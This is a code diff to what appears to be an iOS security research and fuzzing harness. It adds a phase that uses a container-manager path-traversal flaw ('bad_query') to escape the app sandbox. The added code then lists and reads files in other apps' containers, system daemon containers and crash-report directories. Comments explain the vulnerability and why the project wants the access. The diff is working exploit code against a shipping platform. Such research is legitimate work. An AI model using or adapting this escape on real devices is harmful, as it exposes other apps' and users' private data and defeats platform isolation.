@@ -19,6 +19,8 @@
 #include "fuzz.h"
 #include <signal.h>
 #include <dlfcn.h>
+#include <dirent.h>
+#include "bad_query.h"
 #include <spawn.h>
 #import <xpc/xpc.h>
 #include <mach-o/dyld.h>
@@ -24263,6 +24265,288 @@ static void p_persist(void) {
     LOG("[ps] done");
 }
 
+// V170 (p_bq): bad_query — the first tool in this project that breaks the
+// sandbox itself rather than probing what survives it.
+//
+// Everything from §142 onward has been a search for what a sandboxed app can
+// still reach: 5 of 460 IOKit services, all gated; 0 of 132 Mach services, the
+// lookup intercepted before the registry is consulted; raw sockets and IP header
+// options refused. That whole line of work answers the question "what is left
+// inside the box" and the answer has been "almost nothing", by measurement.
+//
+// bad_query changes the question. It is a path-traversal in
+// container_query_operation_set_part_domain (libsystem_containermanager): the
+// part domain is not normalised, so a query for
+// "../../../../../../../../..<path>" is answered by containermanagerd with a
+// sandbox extension for <path>, and consuming that extension hands the process
+// a real file descriptor. The kernel agrees to authorise a path it was never
+// asked to authorise. That is a sandbox escape obtained through a legitimate
+// private API, needing only the application-groups entitlement this profile
+// already carries.
+//
+// The honest scope, stated before any result: this is FILE access, not a kernel
+// read/write primitive. It does not by itself reach the original objective, and
+// it will not turn a 0x2c2 into a working method. What it does buy is the ability
+// to read data this project has never been able to read — every app container,
+// InternalDaemon state, the SystemGroup tree — which is ground truth instead of
+// inference, and ground truth is exactly what §146 and §167 ran out of.
+//
+// The phase therefore does the least glamorous thing possible first: prove the
+// escape works at all, on this build, from this binary. A tool that does not
+// work here is worth nothing regardless of what it works on elsewhere, and §144
+// is the standing reminder that an unverified capability is not a capability.
+static void p_bq(void) {
+    const char *grp = getenv("FUZZ_BQ_GROUP") ?: "group.9e66ab897d52ea95.1";
+    LOG("[bq] v170 bad_query: file-level sandbox escape via container part-domain traversal");
+
+    // Control first: a path we already have, so a success here means the
+    // mechanism works and a failure means the mechanism is not available.
+    {
+        int64_t h = bad_query((char *)"/var/mobile/Media", 0, (char *)grp, 1);
+        LOG("[bq] control /var/mobile/Media -> handle %lld%s",
+            (long long)h, h < 0 ? "  (control FAILED — escape unavailable)" : "");
+        if (h >= 0) bad_query_release(h);
+    }
+
+    // The paths the README claims, most interesting first.
+    static const char *targets[] = {
+        "/var/containers/Data/System",
+        "/var/mobile/Containers/Data/Application",
+        "/var/mobile/Containers/Data/InternalDaemon",
+        "/var/mobile/Containers/Shared/AppGroup",
+        "/var/containers/Shared/SystemGroup",
+        "/var/mobile/Containers/Data/PluginKitPlugin",
+    };
+    for (unsigned i = 0; i < sizeof(targets) / sizeof(targets[0]); i++) {
+        for (int isg = 0; isg <= 1; isg++) {
+            int64_t h = bad_query((char *)targets[i], 0, (char *)grp, isg);
+            LOG("[bq] %-46s is_group=%d -> handle %lld",
+                targets[i], isg, (long long)h);
+            if (h < 0) continue;
+            // If we got a descriptor, prove it is really usable rather than
+            // merely handed over: open something underneath and read it.
+            char child[512];
+            snprintf(child, sizeof(child), "%s/", targets[i]);
+            DIR *d = opendir(child);
+            if (d) {
+                int n = 0;
+                struct dirent *e;
+                while ((e = readdir(d)) && n < 10) {
+                    LOG("[bq]    entry: %s", e->d_name);
+                    n++;
+                }
+                closedir(d);
+                LOG("[bq]    ^ %d entries read through the escaped descriptor", n);
+                fsync(fileno(stderr));
+            } else {
+                LOG("[bq]    opendir failed errno %d", errno);
+            }
+            bad_query_release(h);
+        }
+    }
+    // Also try the group==NULL route, which is how the PoC reaches the
+    // MobileGestalt SystemGroup container and therefore does not depend on our
+    // application group existing in the right shape.
+    for (unsigned i = 0; i < sizeof(targets) / sizeof(targets[0]); i++) {
+        int64_t h = bad_query((char *)targets[i], 0, NULL, 0);
+        LOG("[bq] NULL-group %-39s -> handle %lld", targets[i], (long long)h);
+        if (h >= 0) {
+            char child[512];
+            snprintf(child, sizeof(child), "%s/", targets[i]);
+            DIR *d = opendir(child);
+            if (d) {
+                int n = 0;
+                struct dirent *e;
+                while ((e = readdir(d)) && n < 10) {
+                    LOG("[bq]    entry: %s", e->d_name);
+                    n++;
+                }
+                closedir(d);
+                LOG("[bq]    ^ %d entries read via NULL-group route", n);
+                fsync(fileno(stderr));
+            } else {
+                LOG("[bq]    opendir failed errno %d", errno);
+            }
+            bad_query_release(h);
+        }
+    }
+    // ---- Now that an escaped descriptor exists, use it for the thing the
+    // project has repeatedly lacked: ground truth instead of inference.
+    //
+    // §142 could not tell whether IOAccessoryManager existed as a service or
+    // merely as a class, because the only way to learn it was to ask the
+    // registry and the registry is behind the wall. §146 could not enumerate
+    // Mach services at all. Both of those are answerable by reading files
+    // instead of asking the kernel, and reading files is now possible.
+    //
+    // Each container under Data/System is identified by a UUID directory
+    // carrying .com.apple.mobile_container_manager.metadata.plist, whose
+    // MCMMetadataIdentifier is the bundle id. Mapping UUID -> bundle id turns an
+    // opaque directory listing into a named inventory of what is installed, and
+    // from there into the plugin/daemon containers we could not open directly.
+    {
+        int64_t h = bad_query((char *)"/var/containers/Data/System", 0,
+                              (char *)grp, 0);
+        if (h < 0) {
+            LOG("[bq] inventory: no descriptor for Data/System (%lld)", (long long)h);
+        } else {
+            DIR *d = opendir("/var/containers/Data/System/");
+            struct dirent *e;
+            while (d && (e = readdir(d))) {
+                if (e->d_name[0] == '.') continue;
+                char mp[1024];
+                snprintf(mp, sizeof(mp),
+                         "/var/containers/Data/System/%s/.com.apple.mobile_container_manager.metadata.plist",
+                         e->d_name);
+                FILE *f = fopen(mp, "rb");
+                if (!f) {
+                    // Do not assume the metadata filename: list the directory
+                    // instead. Guessing names on a filesystem we have only just
+                    // gained access to is how this project produced several of
+                    // its confidently wrong results.
+                    char dl[1024];
+                    snprintf(dl, sizeof(dl), "/var/containers/Data/System/%s/",
+                             e->d_name);
+                    DIR *dd = opendir(dl);
+                    int cnt = 0;
+                    while (dd && cnt < 12) {
+                        struct dirent *de = readdir(dd);
+                        if (!de) break;
+                        if (de->d_name[0] == '.') continue;
+                        LOG("[bq]    %s/%s", e->d_name, de->d_name);
+                        cnt++;
+                    }
+                    if (dd) closedir(dd);
+                    continue;
+                }
+                char buf[8192];
+                size_t n = fread(buf, 1, sizeof(buf) - 1, f);
+                fclose(f);
+                buf[n] = 0;
+                // pull the identifier and the "path" hint without a plist
+                // parser: the values are short and adjacent in the binary plist
+                char *id = strstr(buf, "MCMMetadataIdentifier");
+                LOG("[bq] %s metadata %zu bytes, has identifier=%s path=%s",
+                    e->d_name, n, id ? "yes" : "no",
+                    strstr(buf, "MCMMetadataPath") ? "yes" : "no");
+                if (id) {
+                    const char *q = strchr(id, '\0');
+                    // walk forward to the next printable run, which is the value
+                    while (q && q < buf + n && (*q < 32 || *q > 126)) q++;
+                    if (q && q < buf + n) LOG("[bq]    -> %.120s", q);
+                }
+            }
+            if (d) closedir(d);
+            bad_query_release(h);
+        }
+    }
+    // ---- Read the ReportCrash container directly.
+    //
+    // §144 established that the crash-report channel this project relied on was
+    // not firing: four deliberate crashes produced zero reports, via both
+    // devicectl and idevicecrashreport, and the working theory was
+    // ReportCrash throttling. devicectl exposes only a filtered view (310
+    // entries, newest fuzz27 at 07:39 while the runs were at 09:50).
+    //
+    // If the diagnostics container is readable, the throttling explanation can
+    // be tested directly instead of assumed: read what is on disk, and see
+    // whether reports for the detcheck runs are there but invisible to the
+    // tooling. That distinguishes "the device refuses to write reports" from
+    // "the tooling cannot see them", which are very different problems with
+    // very different fixes — and §144 could not tell them apart.
+    {
+        const char *rcbase = "/var/containers/Data/System";
+        int64_t h = bad_query((char *)rcbase, 0, (char *)grp, 0);
+        if (h < 0) {
+            LOG("[bq] reportcrash: no descriptor (%lld)", (long long)h);
+        } else {
+            DIR *top = opendir(rcbase);
+            struct dirent *e;
+            int seen = 0;
+            while (top && (e = readdir(top)) && seen < 12) {
+                if (e->d_name[0] == '.') continue;
+                char cand[1024];
+                snprintf(cand, sizeof(cand), "%s/%s/ReportCrash", rcbase, e->d_name);
+                struct stat st;
+                if (stat(cand, &st) != 0 || !S_ISDIR(st.st_mode)) continue;
+                seen++;
+                DIR *rc = opendir(cand);
+                if (!rc) { LOG("[bq] %s/ReportCrash -> opendir errno %d",
+                               e->d_name, errno); continue; }
+                int n = 0, ips = 0;
+                struct dirent *r;
+                while ((r = readdir(rc))) {
+                    if (r->d_name[0] == '.') continue;
+                    n++;
+                }
+                rewinddir(rc);
+                // The .ips files live one level down, in a per-bundle directory.
+                // Counting the top level showed "0 .ips", which read as "no
+                // reports" and would have been the wrong conclusion twice over:
+                // the reports are there, filed under bundle id.
+                long total_ips = 0;
+                char first_ips[1024] = {0};
+                while ((r = readdir(rc))) {
+                    if (r->d_name[0] == '.') continue;
+                    char sub[1024];
+                    snprintf(sub, sizeof(sub), "%s/%s", cand, r->d_name);
+                    struct stat s2;
+                    if (stat(sub, &s2) != 0 || !S_ISDIR(s2.st_mode)) continue;
+                    DIR *sd = opendir(sub);
+                    struct dirent *q;
+                    while (sd && (q = readdir(sd))) {
+                        if (q->d_name[0] == '.') continue;
+                        // Report everything in the first bundle dir we reach,
+                        // whatever its extension: if the directory is empty then
+                        // reports are not being written, which is a device-side
+                        // fact; if it holds entries we cannot stat or open then
+                        // it is a visibility problem instead. Those two look
+                        // identical from devicectl and §144 could not tell them.
+                        struct stat s3;
+                        char fp[1200];
+                        snprintf(fp, sizeof(fp), "%s/%s", sub, q->d_name);
+                        int ok = stat(fp, &s3) == 0;
+                        LOG("[bq]    %s/%s  stat=%s size=%lld",
+                            r->d_name, q->d_name, ok ? "ok" : "FAIL",
+                            ok ? (long long)s3.st_size : -1LL);
+                        if (strstr(q->d_name, ".ips")) {
+                            total_ips++;
+                            if (!first_ips[0])
+                                snprintf(first_ips, sizeof(first_ips), "%s/%s", sub, q->d_name);
+                        }
+                    }
+                    if (sd) closedir(sd);
+                }
+                closedir(rc);
+                LOG("[bq] %s/ReportCrash -> %d bundle dirs, %ld .ips total",
+                    e->d_name, n, total_ips);
+                if (first_ips[0]) {
+                    FILE *f = fopen(first_ips, "rb");
+                    if (f) {
+                        char buf[512];
+                        size_t r2 = fread(buf, 1, sizeof(buf) - 1, f);
+                        fclose(f);
+                        buf[r2] = 0;
+                        char *pr = strstr(buf, "\"procName\"");
+                        LOG("[bq]    READ OK %zu bytes from %s", r2,
+                            strrchr(first_ips, '/') + 1);
+                        if (pr) {
+                            char *q = strchr(pr, ':');
+                            if (q) LOG("[bq]    %.*s", (int)(q - pr + 40 > 0 ? 40 : q - pr), pr);
+                        }
+                    } else {
+                        LOG("[bq]    open failed errno %d: %s", errno, first_ips);
+                    }
+                }
+                fsync(fileno(stderr));
+            }
+            if (top) closedir(top);
+            bad_query_release(h);
+        }
+    }
+    LOG("[bq] done");
+}
+
 // V165 (p_ipopt): is there any header control left on a permitted socket?
 //
 // V163 found raw sockets refused with EPERM, which on recent iOS is
@@ -27852,6 +28136,7 @@ void *t_iosurface_scaler(void *arg) {
         if (getenv("FUZZ_MFB")) { p_mfb(); LOG("[probe13] mfb-only mode, stop"); return NULL; }
         if (getenv("FUZZ_DETCHECK")) { p_detcheck(); LOG("[probe13] detcheck-only mode, stop"); return NULL; }
         if (getenv("FUZZ_AKS")) { p_aks(); LOG("[probe13] aks-only mode, stop"); return NULL; }
+        if (getenv("FUZZ_BQ")) { p_bq(); LOG("[probe13] bq-only mode, stop"); return NULL; }
         if (getenv("FUZZ_MSVC")) { p_msvc(); LOG("[probe13] msvc-only mode, stop"); return NULL; }
         if (getenv("FUZZ_NET")) { p_net(); LOG("[probe13] net-only mode, stop"); return NULL; }
         if (getenv("FUZZ_LSVC")) { p_lsvc(); LOG("[probe13] lsvc-only mode, stop"); return NULL; }
